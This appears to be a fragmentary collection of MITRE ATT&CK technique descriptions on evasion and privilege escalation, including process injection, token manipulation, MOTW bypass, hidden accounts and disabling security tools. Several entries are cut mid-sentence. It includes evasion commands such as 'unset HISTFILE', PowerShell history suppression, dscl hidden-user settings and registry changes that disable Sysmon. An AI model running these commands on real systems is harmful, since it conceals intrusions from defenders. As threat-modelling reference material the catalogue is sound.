        an existing victim process is first created with native Windows API calls
        such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can
        be used to invoke a function (such as <code>LoadLibrayA</code> pointing to
        a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\",
        involves creating a suspended process in which malicious code can be written
        and executed before the process' entry point (and potentially subsequent anti-malware
        hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation:
        ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke
        malicious code previously written to the global atom table.(Citation: Microsoft
        Atom Table)\n\nRunning code in the context of another process may allow access
        to the process's memory, system/network resources, and possibly elevated privileges.
        Execution via APC injection may also evade detection from security products
        since the execution is masked under a legitimate process. "

        Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)

        Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)

        Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

        Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)

        Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.

        Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)).

      description: "Adversaries may inject portable executables (PE) into processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        PE injection is a method of executing arbitrary code in the address space
        of a separate live process. \n\nPE injection is commonly performed by copying
        code (perhaps without a file on disk) into the virtual address space of the
        target process before invoking it via a new thread. The write can be performed
        with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,
        then invoked with <code>CreateRemoteThread</code> or additional code (ex:
        shellcode). The displacement of the injected code does introduce the additional
        requirement for functionality to remap memory references. (Citation: Elastic
        Process Injection July 2017) \n\nRunning code in the context of another process
        may allow access to the process's memory, system/network resources, and possibly
        elevated privileges. Execution via PE injection may also evade detection from
        security products since the execution is masked under a legitimate process. "

      description: |+
        Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

        Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

      description: |-
        Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

        Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.

        Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)

      description: |-
        Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

        An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

        When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.

      name: Port Knocking
      description: |-
        Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

        This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

      description: "Adversaries may use hidden users to hide the presence of user
        accounts they create or modify. Administrators may want to hide users when
        there are many user accounts on a given system or if they want to hide their
        administrative or other management accounts from other users. \n\nIn macOS,
        adversaries can create or modify a user to be hidden through manipulating
        plist files, folder attributes, and user attributes. To prevent a user from
        being shown on the login screen and in System Preferences, adversaries can
        set the userID to be under 500 and set the key value <code>Hide500Users</code>
        to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code>
        plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated
        with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>,
        users with a userID under 500 do not appear on the login screen and in System
        Preferences. Using the command line, adversaries can use the <code>dscl</code>
        utility to create hidden user accounts by setting the <code>IsHidden</code>
        attribute to <code>1</code>. Adversaries can also hide a user’s home folder
        by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide
        a User Account) \n\nAdversaries may similarly hide user accounts in Windows.
        Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code>
        Registry key value to <code>0</code> for a specific user to prevent that user
        from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation:
        US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts
        from the login screen, also referred to as the greeter. The method an adversary
        may use depends on which Display Manager the distribution is currently using.
        For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts
        may be hidden from the greeter using the <code>gsettings</code> command (ex:
        <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation:
        Hide GDM User Accounts) Display Managers are not anchored to specific distributions
        and may be changed by a user or adversary."

      name: 'Impair Defenses: Impair Command History Logging'
      description: "Adversaries may impair command history logging to hide commands
        they run on a compromised system. Various command interpreters keep track
        of the commands users type in their terminal so that users can retrace what
        they've done. \n\nOn Linux and macOS, command history is tracked in a file
        pointed to by the environment variable <code>HISTFILE</code>. When a user
        logs off a system, this information is flushed to a file in the user's home
        directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code>
        environment variable keeps track of what should be saved by the <code>history</code>
        command and eventually into the <code>~/.bash_history</code> file when a user
        logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but
        can be set by the user and will be respected. The `HISTFILE` environment variable
        is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence
        ESXi VIBs 2022)\n\nAdversaries may clear the history environment variable
        (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export
        HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code>
        can be configured to ignore commands that start with a space by simply setting
        it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore
        duplicate commands by setting it to \"ignoredups\". In some Linux systems,
        this is set by default to \"ignoreboth\" which covers both of the previous
        examples. This means that “ ls” will not be saved, but “ls” would be saved
        by history. Adversaries can abuse this to operate without leaving traces by
        simply prepending a space to all of their terminal commands. \n\nOn Windows
        systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell
        sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>
        by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption
        -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code>
        to stop receiving logs. Additionally, it is possible to turn off logging to
        this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle
        SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation:
        Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History
        Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        on network devices to disable historical command logging (e.g. <code>no logging</code>)."

      name: 'Access Token Manipulation: Parent PID Spoofing'
      description: |-
        Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

        Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

        Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)

        hijacking in order to evade process-based defenses as well as possibly elevate
        privileges. Virtual dynamic shared object (vdso) hijacking is a method of
        executing arbitrary code in the address space of a separate live process.
        \n\nVDSO hijacking involves redirecting calls to dynamically linked shared
        libraries. Memory protections may prevent writing executable code to a process
        via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008).
        However, an adversary may hijack the syscall interface code stubs mapped into
        a process from the vdso shared object to execute syscalls to open and map
        a malicious shared object. This code can then be invoked by redirecting the
        execution flow of the process via patched memory address references stored
        in a process' global offset table (which store absolute addresses of mapped
        library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace
        VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in
        the context of another process may allow access to the process's memory, system/network
        resources, and possibly elevated privileges. Execution via VDSO hijacking
        may also evade detection from security products since the execution is masked
        under a legitimate process.  "

      name: Services File Permissions Weakness
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

        Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

        An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

        A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

        The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.

        Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)


        ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.

      name: 'Impair Defenses: Disable or Modify Tools'
      description: "Adversaries may modify and/or disable security tools to avoid
        possible detection of their malware/tools and activities. This may take many
        forms, such as killing security software processes or services, modifying
        / deleting Registry keys or configuration files so that tools do not operate
        properly, or other methods to interfere with security tools scanning or reporting
        information. Adversaries may also disable updates to prevent the latest security
        patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries
        may trigger a denial-of-service attack via legitimate system processes. It
        has been previously observed that the Windows Time Travel Debugging (TTD)
        monitor driver can be used to initiate a debugging session for a security
        tool (e.g., an EDR) and render the tool non-functional.  By hooking the debugger
        into the EDR process, all child processes from the EDR will be automatically
        suspended. The attacker can terminate any EDR helper processes (unprotected
        by Windows Protected Process Light) by abusing the Process Explorer driver.
        In combination this will halt any attempt to restart services and cause the
        tool to crash.(Citation: Cocomazzi FIN7 Reboot)\n\nAdversaries may also tamper
        with artifacts deployed and utilized by security tools. Security tools may
        make dynamic changes to system components in order to maintain visibility
        into specific events. For example, security products may load their own modules
        and/or modify those loaded by processes to facilitate data collection. Similar
        to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries
        may unhook or otherwise modify these features added by tools (especially those
        that exist in userland or are otherwise potentially accessible to adversaries)
        to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System
        Calls) For example, adversaries may abuse the Windows process mitigation policy
        to block certain endpoint detection and response (EDR) products from loading
        their user-mode code via DLLs. By spawning a process with the PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
        attribute using API calls like UpdateProcThreadAttribute, adversaries may
        evade detection by endpoint security solutions that rely on DLLs that are
        not signed by Microsoft. Alternatively, they may add new directories to an
        EDR tool’s exclusion list, enabling them to hide malicious files via [File/Path
        Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry
        WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries
        may also focus on specific applications such as Sysmon. For example, the “Start”
        and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>
        may be modified to tamper with and potentially disable Sysmon logging.(Citation:
        disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to
        skip digital signature verification checks by altering startup configuration
        files and effectively disabling firmware verification that typically occurs
        at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected
        Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn
        cloud environments, tools disabled by adversaries may include cloud monitoring
        agents that report back to services such as AWS CloudWatch or Google Cloud
        Monitor.\n\nFurthermore, although defensive tools may have anti-tampering
        mechanisms, adversaries may abuse tools such as legitimate rootkit removal
        kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation:
        dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike)
        For example, adversaries have used tools such as GMER to find and shut down
        hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally,
        adversaries may exploit legitimate drivers from anti-virus software to gain
        access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)),
        which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)"

      description: |-
        Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

        There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

        Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

        A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.

      name: Valid Accounts
      description: |-
        Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

        In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

        The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)

      name: 'Process Injection: Process Hollowing'
      description: "Adversaries may inject malicious code into suspended and hollowed
        processes in order to evade process-based defenses. Process hollowing is a
        method of executing arbitrary code in the address space of a separate live
        process.  \n\nProcess hollowing is commonly performed by creating a process
        in a suspended state then unmapping/hollowing its memory, which can then be
        replaced with malicious code. A victim process can be created with native
        Windows API calls such as <code>CreateProcess</code>, which includes a flag
        to suspend the processes primary thread. At this point the process can be
        unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>
        \ before being written to, realigned to the injected code, and resumed via
        <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>,
        then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation:
        Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local
        Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new
        process rather than targeting an existing process. This behavior will likely
        not result in elevated privileges since the injected process was spawned from
        (and thus inherits the security context) of the injecting process. However,
        execution via process hollowing may also evade detection from security products
        since the execution is masked under a legitimate process. "

      description: |-
        Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)

        Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)

      description: "Adversaries may attempt to make an executable or file difficult
        to discover or analyze by encrypting, encoding, or otherwise obfuscating its
        contents on the system or in transit. This is common behavior that can be
        used across different platforms and the network to evade defenses. \n\nPayloads
        may be compressed, archived, or encrypted in order to avoid detection. These
        payloads may be used during Initial Access or later to mitigate detection.
        Sometimes a user's action may be required to open and [Deobfuscate/Decode
        Files or Information](https://attack.mitre.org/techniques/T1140) for [User
        Execution](https://attack.mitre.org/techniques/T1204). The user may also be
        required to input a password to open a password protected compressed/encrypted
        file that was provided by the adversary. (Citation: Volexity PowerDuke November
        2016) Adversaries may also use compressed or archived scripts, such as JavaScript.
        \n\nPortions of files can also be encoded to hide the plain-text strings that
        would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A
        We Live Security Analysis) Payloads may also be split into separate, seemingly
        benign files that only reveal malicious functionality when reassembled. (Citation:
        Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command

        executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).
        Environment variables, aliases, characters, and other platform/language specific

      name: Run Virtual Instance
      description: |-
        Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)

        Adversaries may utilize native support for virtualization (ex: Hyper-V), deploy lightweight emulators (ex: QEMU), or drop the necessary files to run a virtual instance (ex: VirtualBox binaries).(Citation: Securonix CronTrap 2024) After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)

        Threat actors may also leverage temporary virtualized environments such as the Windows Sandbox, which supports the use of `.wsb` configuration files for defining execution parameters. For example, the `<MappedFolder>` property supports the creation of a shared folder, while the `<LogonCommand>` property allows the specification of a payload.(Citation: ESET MirrorFace 2025)

        In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)

      description: |-
        Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

        With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators.

      name: Network Boundary Bridging
      description: |-
        Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

        Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.

        When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.

        Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

        Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)

        Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.

        Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.

        For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)

      description: |-
        Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

        Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

